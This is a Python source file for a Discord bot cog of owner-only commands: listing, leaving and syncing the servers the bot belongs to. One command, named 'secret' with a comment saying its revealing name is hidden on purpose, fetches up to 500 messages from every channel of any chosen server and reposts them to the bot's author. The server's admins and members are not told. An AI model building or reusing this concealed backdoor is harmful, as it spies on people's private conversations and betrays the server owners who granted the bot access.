import disnake
from disnake.ext import commands


class AuthorCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.pool = bot.get_pool()

    async def get_bot_author(self, member_id):
        query = ("SELECT * "
                 "FROM bot_author "
                 "WHERE user_id = $1")
        bot_author_ids = await self.pool.fetch(query, member_id)
        if not bot_author_ids:
            return
        bot_author_ids = [bot_author_id["user_id"] for bot_author_id in bot_author_ids]
        return bot_author_ids

    @commands.slash_command()  # Говорящее название команды скрыто специально
    async def secret(self, ctx: disnake.CommandInteraction, num):
        """Команда для автора бота"""
        # Команда для просмотра сообщений сервера
        bot_author_ids = await self.get_bot_author(ctx.author.id)
        if ctx.author.id not in bot_author_ids:
            return await ctx.send("Вы не можете использовать эту команду", ephemeral=True)

        guild: disnake.Guild = await self.bot.fetch_guild(num)
        channels = await guild.fetch_channels()
        await ctx.response.defer()
        for channel in channels:
            try:
                await ctx.send(f"Fetching {channel.name}")
                async for message in channel.history(limit=500):
                    content = message.content
                    await ctx.send(content=content)
            except Exception as e:
                await ctx.send(f"Skipping channel {channel.name}:\n{e}")

    @commands.slash_command()
    async def leave(self, ctx: disnake.CommandInteraction, id):
        """Команда для автора бота"""
        bot_author_ids = await self.get_bot_author(ctx.author.id)
        if ctx.author.id not in bot_author_ids:
            return await ctx.send("Вы не можете использовать эту команду", ephemeral=True)
        guild: disnake.Guild = await self.bot.fetch_guild(id)
        await guild.leave()
        await ctx.send(f"Бот успешно вышел с сервера: {guild.name} `({guild.id})`", ephemeral=True)

    @commands.slash_command()
    async def get_guilds(self, ctx: disnake.CmdInter):
        """Команда для автора бота"""
        bot_author_ids = await self.get_bot_author(ctx.author.id)
        if ctx.author.id not in bot_author_ids:
            return await ctx.send("Вы не можете использовать эту команду", ephemeral=True)
        guilds = await self.bot.fetch_guilds().flatten()

        counter = 1
        message = f"Активные серверы ({len(guilds)}):\n"
        for guild in guilds:
            message += f"{counter}) {guild.name}, id: {guild.id}\n"
            counter += 1

        await ctx.send(f"{message}", ephemeral=True)

    # @commands.slash_command()
    # async def create_invite(self, ctx, server_id):
    #     guild: disnake.Guild = await self.bot.fetch_guild(server_id)
    #     invites = await guild.invites()
    #     await ctx.send(f"{invites[0]}")

    @commands.slash_command()
    async def sync_guilds(self, ctx: disnake.CmdInter):
        """Команда для автора бота"""
        bot_author_ids = await self.get_bot_author(ctx.author.id)
        if ctx.author.id not in bot_author_ids:
            return await ctx.send("Вы не можете использовать эту команду", ephemeral=True)
        guilds = await self.bot.fetch_guilds().flatten()
        for guild in guilds:
            guild = await self.bot.fetch_guild(guild.id)
            query = ("INSERT INTO guild (id, owner_id) "
                     "VALUES ($1, $2)"
                     "ON CONFLICT (id) DO NOTHING")
            await self.pool.execute(query, guild.id,
                                    guild.owner_id)
        await ctx.send(f"Серверы успешно синхронизированы", ephemeral=True)


def setup(bot):
    bot.add_cog(AuthorCommands(bot))


